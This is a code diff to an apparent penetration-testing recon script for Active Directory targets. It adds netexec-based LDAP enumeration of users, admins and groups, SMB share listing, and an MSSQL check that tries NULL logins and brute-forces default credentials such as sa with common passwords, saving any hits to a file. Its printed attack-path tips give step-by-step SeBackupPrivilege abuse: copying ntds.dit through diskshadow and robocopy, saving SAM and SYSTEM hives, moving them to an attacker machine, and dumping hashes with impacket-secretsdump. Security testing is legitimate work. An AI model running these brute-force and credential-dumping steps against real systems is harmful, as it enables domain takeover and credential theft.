@@ -46,6 +46,7 @@ TARGET_IPV4=""
 TARGET_FQDN=""
 DOMAIN_CONTROLLER=""
 ENABLE_VHOST=false
+ENABLE_MSSQL_BRUTE=false
 ENABLE_KERB_ENUM=false
 ENABLE_WEB_ENUM=false
 ENABLE_BH_EXPORT=false
@@ -164,7 +165,9 @@ for arg in "$@"; do
         --vhost) ENABLE_VHOST=true ;;
         --kerb-enum) ENABLE_KERB_ENUM=true ;;
         --user=*) AUTH_USER="${arg#*=}" ;;
+        --username=*) AUTH_USER="${arg#*=}" ;;
         --pass=*) AUTH_PASS="${arg#*=}" ;;
+        --password=*) AUTH_PASS="${arg#*=}" ;;
         -u=*) AUTH_USER="${arg#*=}" ;;
         -p=*) AUTH_PASS="${arg#*=}" ;;
         --domain=*) AUTH_DOMAIN="${arg#*=}" ;;
@@ -172,6 +175,7 @@ for arg in "$@"; do
         --run-blood) ENABLE_BH_EXPORT=true ;;
         --kerberoast) ENABLE_KERBROAST=true ;;
         --check-certs) ENABLE_ADCS=true ;;
+        --mssql-brute) ENABLE_MSSQL_BRUTE=true ;;
         *) [ -z "$TARGET" ] && TARGET="$arg" ;;
     esac
 done
@@ -898,14 +902,24 @@ ldap_enum() {
     if [[ "$NTLM_ENABLED" == true ]]; then
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
         echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --users${RESET}"
+        #mapfile -t LDAP_USERS < <(
+            #$LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --users 2>/dev/null \
+            #    | sed -nE '
+            #        /^\s*LDAP/ {
+            #            /\[|\]|-Username-|Enumerated/ b
+            #            s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
+            #        }
+            #    ' \
+            #    | sort -u
+        #)
         mapfile -t LDAP_USERS < <(
-            $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --users 2>/dev/null \
-                | sed -nE '
-                    /^\s*LDAP/ {
-                        /\[|\]|-Username-|Enumerated/ b
-                        s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
+            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --users 2>/dev/null \
+                | awk '
+                    $1 == "LDAP" && $5 != "-Username-" && $5 != "" && $5 !~ /^\[|\]/ {
+                        print $5
                     }
                 ' \
+                | grep -v '^$' \
                 | sort -u
         )
     else
@@ -955,12 +969,23 @@ ldap_enum() {
     if [[ "$NTLM_ENABLED" == true ]]; then
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
         echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --admin-count${RESET}"
+        #mapfile -t LDAP_ADMIN_USERS < <(
+        #    $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --admin-count 2>/dev/null \
+        #        | sed -nE '
+        #            /^\s*LDAP/ {
+        #                /\[|\]|-Username-|Enumerated/ b
+        #                s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
+        #            }
+        #        ' \
+        #        | sort -u
+        #)
         mapfile -t LDAP_ADMIN_USERS < <(
-            $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --admin-count 2>/dev/null \
-                | sed -nE '
-                    /^\s*LDAP/ {
-                        /\[|\]|-Username-|Enumerated/ b
-                        s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
+            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --admin-count 2>/dev/null \
+                | awk '
+                    $1 == "LDAP" &&
+                    $5 != "" &&
+                    $5 !~ /^\[|\]/ {
+                        print $5
                     }
                 ' \
                 | sort -u
@@ -1012,17 +1037,32 @@ ldap_enum() {
     if [[ "$NTLM_ENABLED" == true ]]; then
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
         echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --groups${RESET}"
+        #mapfile -t LDAP_GROUPS_RAW < <(
+        #    $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --groups 2>/dev/null \
+        #        | sed -nE '
+        #            /^\s*LDAP.*membercount:/ {
+        #                s/^.*AUTHORITY[[:space:]]+//
+        #                s/[[:space:]]+membercount:/|/g
+        #                s/^[[:space:]]+|[[:space:]]+$//g
+        #                p
+        #            }
+        #        ' \
+        #        | sort -u
+        #)
         mapfile -t LDAP_GROUPS_RAW < <(
-            $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --groups 2>/dev/null \
-                | sed -nE '
-                    /^\s*LDAP.*membercount:/ {
-                        s/^.*AUTHORITY[[:space:]]+//
-                        s/[[:space:]]+membercount:/|/g
-                        s/^[[:space:]]+|[[:space:]]+$//g
-                        p
+            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --groups 2>/dev/null \
+                | awk '
+                    /^\s*LDAP/ && $6 ~ /^[1-9][0-9]*$/ {
+                        # Reconstruct: GroupName|MemberCount|Description
+                        group = $5
+                        member_count = $6
+                        # Capture everything after the member count (description)
+                        $1=""; $2=""; $3=""; $4=""; $5=""; $6=""
+                        desc = substr($0, index($0, $7))
+                        gsub(/^[[:space:]]+|[[:space:]]+$/, "", desc)
+                        printf "%s|%s|%s\n", group, member_count, desc
                     }
-                ' \
-                | sort -u
+                ' | sort -u
         )
     else
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
@@ -1244,7 +1284,7 @@ ldap_enum() {
                     object_type = "";
                     trustee = "";
                 }
-                /^🛠.*ACE\[[0-9]+\]/ {
+                /^.*ACE\[[0-9]+\]/ {
                     ace_idx = $0;
                     flag = 1;
                     access_mask = "";
@@ -2433,15 +2473,26 @@ if [ -s "$SMB_MARKER" ]; then
         local AUTH="$1" # User
         local LABEL="$2"
 
-        SHARES=$(smbclient -L "//$TARGET_IPV4" -U "$AUTH" 2>/dev/null \
-            | awk '$2 == "Disk" { print $1 }')
-
+        #SHARES=$(smbclient -L "//$TARGET_IPV4" -U "$AUTH" 2>/dev/null \
+        #    | awk '$2 == "Disk" { print $1 }')
+        SHARES=$(smbclient -L "//$TARGET_IPV4" -U "$AUTH" 2>/dev/null | awk '
+        {
+            if ($2 == "Disk") { 
+                print $1  
+            }else if ($3 == "Disk") { 
+                print $1 " " $2  
+            }else if ($4 == "Disk") { 
+                print $1 " " $2 " " $3 
+            }
+        }')
+        
         [ -z "$SHARES" ] && return 1
 
         critical "  SMB allows $LABEL access"
         notify "   $ICON_SHARE SMB shares ($LABEL):"
 
-        for share in $SHARES; do
+        #for share in $SHARES; do
+        while IFS= read -r share; do
             [[ "$share" =~ ^(IPC\$|ADMIN\$)$ ]] && continue
 
             smbclient "//$TARGET_IPV4/$share" -U "$AUTH" -c "ls" >/dev/null 2>&1 \
@@ -2456,7 +2507,8 @@ if [ -s "$SMB_MARKER" ]; then
             	#echo "     [DEBUG] smb_enum_smbclient()"
    		smb_list_files "$share" "$AUTH" "$LABEL"
 	    fi
-        done
+        #done
+        done <<< "$SHARES"
 
         SMB_ENUM_SUCCESS=true
         [ "$LABEL" = "NULL session" ] && SMB_NULL_OK=true
@@ -2781,6 +2833,78 @@ if [ -s "$KERB_MARKER" ]; then
         notify "Kerberos detected, but domain/realm could not be resolved"
     fi
 fi
+
+#############################################
+# SQL Instance Identified - Enumerate it
+#############################################
+HAS_MSSQL=false
+# -------- MSSQL Reminder --------
+if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "1433"; then
+    HAS_MSSQL=true
+fi
+
+# Mark that a live MSSQL instance was found
+MSSQL_NULL_LOGIN=false
+MSSQL_AUTH_OK=false
+MSSQL_INSTANCE_FOUND=false
+MSSQL_USER=""
+if [[ "$HAS_MSSQL" == true ]]; then
+    echo
+    info "MSSQL service detected on port 1433 — beginning enumeration..."
+
+    MSSQL_ENUM_OUTPUT=""
+    
+    if command -v crackmapexec >/dev/null 2>&1 || command -v netexec >/dev/null 2>&1; then
+        tool=$(command -v crackmapexec || command -v netexec)
+        DATE_TAG=$(date +"%Y%m%d_%H%M%S")
+        # 1. Try NULL session
+        MSSQL_ENUM_OUTPUT=$($tool mssql "$TARGET_IPV4" -u '' -p '' 2>/dev/null)
+        echo "$MSSQL_ENUM_OUTPUT" | tee "mssql_nullenum_${TARGET_IPV4}_${DATE_TAG}.txt"
+
+        if echo "$MSSQL_ENUM_OUTPUT" | grep -qP "\[\+\]"; then
+            critical "MSSQL allows NULL login!"
+            MSSQL_NULL_LOGIN=true
+        elif echo "$MSSQL_ENUM_OUTPUT" | grep -qP "\[-\]"; then
+            warn "MSSQL denied NULL login"
+        fi
+        
+        # Extract any username if present
+        MSSQL_USER=$(echo "$MSSQL_ENUM_OUTPUT" | grep -oP '\+\] \K\S+(?=[:@])' | head -n1)
+        if [[ -n "$MSSQL_USER" ]]; then
+            lightbulb "Valid user identified from service banner: ${YELLOW}$MSSQL_USER${RESET}"
+        fi
+
+        # 2. Try default credentials
+        if [[ "$ENABLE_MSSQL_BRUTE" == true ]]; then
+            echo
+            info "Testing default MSSQL credentials..."
+            declare -a DEFAULT_USERS=("sa" "admin" "sql" "sqladmin" "dbo" "dba")
+            declare -a DEFAULT_PASSWORDS=("" "sa" "default" "superadmin" "password" "admin" "1234" "12345" "123456" "P@ssw0rd" "admin123" "root")
+
+            for user in "${DEFAULT_USERS[@]}"; do
+                for pass in "${DEFAULT_PASSWORDS[@]}"; do
+                    OUT=$($tool mssql "$TARGET_IPV4" -u "$user" -p "$pass" 2>/dev/null)
+                     if echo "$OUT" | grep -qP "\[\+\]"; then
+                        critical "Valid MSSQL default credentials found: ${YELLOW}$user${RESET}:${GREEN}$pass${RESET}"
+                        MSSQL_DEFAULT_CREDS_FOUND=true
+                        MSSQL_USER="$user"
+                        # Optionally save for later use
+                        echo "$user:$pass" > "mssql_default_creds_${TARGET_IPV4}_${DATE_TAG}.txt"
+                        break 2
+                     fi
+                 done
+             done
+         fi
+    else
+        warn "Neither crackmapexec nor netexec is available to enumerate MSSQL."
+    fi
+
+    # Optional: set flags or write to a report file for decision engine
+    echo "MSSQL_ENUM=true" >> recon_flags.txt
+    [[ "$MSSQL_NULL_LOGIN" == true ]] && echo "MSSQL_NULL_LOGIN=true" >> recon_flags.txt
+fi
+
+
 
 #############################################
 # Check to see what Credentials can access
@@ -3399,8 +3523,16 @@ if [[ $HAS_LDAP -eq 1 && $HAS_KERB -eq 1 && $DC_AUTH_OK -eq 1 ]]; then
       echo -e "    Re-run with ${BLUE}--run-blood${RESET} to enable auto bloodhound export"
       echo "    Example:"
       echo "      ./bash_simpleportscan.sh $TARGET --run-blood"
-      echo
    fi
+fi
+# Attempt MSSQL Brute Force
+if [[ "$HAS_MSSQL" == true && "$ENABLE_MSSQL_BRUTE" == false ]]; then
+    echo
+    alert "${BLUE}Tip:${RESET} MSSQL Service/Database detected"
+    echo "  --------------------------------------"
+    echo -e "    Re-run with ${BLUE}--mssql-brute${RESET} to attempt 'safe' user brute force"
+    echo "    Example:"
+    echo "      ./bash_simpleportscan.sh $TARGET_IPV4 --mssql-brute"
 fi
 
 # Initialize NTLM Detection
@@ -3635,15 +3767,20 @@ attack_path_evaluation() {
         echo "   - Example SharpBackup usage:"
         echo '         SharpBackup.exe backup /file:C:\\windows\\ntds\\ntds.dit'
         echo '   - Alternatively, use diskshadow to create shadow copies:"'
-        echo "         diskshadow"
-        echo "         set context persistent nowriters"
-        echo "         add volume c: alias myshadow"
-        echo "         create"
-        echo "         expose %myshadow% x:"
-        echo '         copy x:\\windows\\ntds\\ntds.dit C:\\temp\\ntds.dit'
-        echo '         copy x:\\windows\\system32\\config\SYSTEM C:\\temp\\SYSTEM'
+        echo "         Copy: /home/kali/Documents/smbserverfiles/seBackupPriv_Abuse/grapejuice.dsh"
+        echo "         diskshadow /s grapejuice.dsh"
+        echo "         robocopy /b h:\\windows\\ntds . ntds.dit"
+	echo '         reg save hklm\system c:\\Temp\\system'
+        echo '         + Transfer to Attacker Machine for local cracking'
+        echo '   - Alternatively, copy registry:"'
+        echo '         cd c:\'
+	echo '         mkdir Temp'
+	echo '         reg save hklm\sam c:\\Temp\\sam'
+	echo '         reg save hklm\system c:\\Temp\\system'
+	echo '         + Transfer to Attacker Machine for local cracking'
         echo "   - Then use impacket-secretsdump locally:"
-        echo "         secretsdump.py -system SYSTEM -ntds ntds.dit -outputfile creds.txt LOCAL"
+        echo "         impacket-secretsdump LOCAL -system SYSTEM -ntds ntds.dit -outputfile creds.txt "
+        echo "         impacket-secretsdump LCOAL -system SYSTEM -sam SAM -outputfile creds.txt "
         echo
     fi
     # 5b. SeImpersonatePrivilege Exploitation
